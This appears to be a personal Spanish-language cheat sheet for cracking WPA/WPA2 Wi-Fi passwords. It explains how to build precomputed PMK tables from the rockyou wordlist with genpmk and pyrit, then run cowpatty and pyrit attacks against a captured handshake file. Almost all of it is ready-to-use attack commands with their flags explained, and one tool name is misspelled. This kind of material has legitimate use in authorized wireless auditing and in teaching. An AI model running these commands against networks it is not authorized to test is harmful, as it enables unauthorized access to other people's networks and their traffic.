#  Rainbow Tables 

Tags: #RainbowTable #WPA/WPA2 

##  Aumento de la velocidad de computo 

```bash 
1. Filtrar la parte del 'handshake'
2. Leer la passwd 
3. Ver el algortimo de encrytacion 
4. Encryptarla 
5. Compararla con el 'hash' que ya poseemos del 'handshake'
6. True or False 

# Para poder hacer esos pasos anteriores mas rapido, podriamos crearnos un diccionario de 'Claves Precomputadas = diccionario de hashes' y lo podemos hacer con las siguinetes tools:
1. Cowpatty
2. Pyrit
```

## Creación de una Rainbow table 

```bash 
❯ genpmk -f /usr/share/wordlists/rockyou.txt -s <AP> -d <dict.genpmk>
	# f = Diccionario original que contiene las passwd
	# s = Nombre del AP
	# d = Nombre del output del archivo hash que crearemos 
```

## Usando Cowpatty y la rainbow-table

```bash 
❯ cowwpatty -d <dict.genpmk> -r Captura.cap -s <AP>
	# d = Archivo que hemos creado con extension genpmk
	# r = Archivo de la captura 
	# s = Nombre del AP
```

## Usando Pyrit y la rainbow-table

```bash
❯ pyrit -e <AP> -i <dict.genpmk> -r Captura.cap attack_cowpatty
	# e = Nombre del AP
	# i = Archivo del diccionario 
	# r = Archivo de la captura 
	# attack = Tipo de ataque 
```

## Usando Pyrit y la Base de datos

```bash
1. ❯ pyrit -i /usr/share/wordlists/rockyou.txt import_passwords 
	# i = Diccionario de passwd
2. ❯ pyrit -e <AP> create_essid
	# e = Nombre del AP
3. ❯ pyrit batch 


# Ahora podemos hacer el ataque de fuerza bruta a una velocidad abismal 
❯ pyrit -r Captura.cap attack_db
```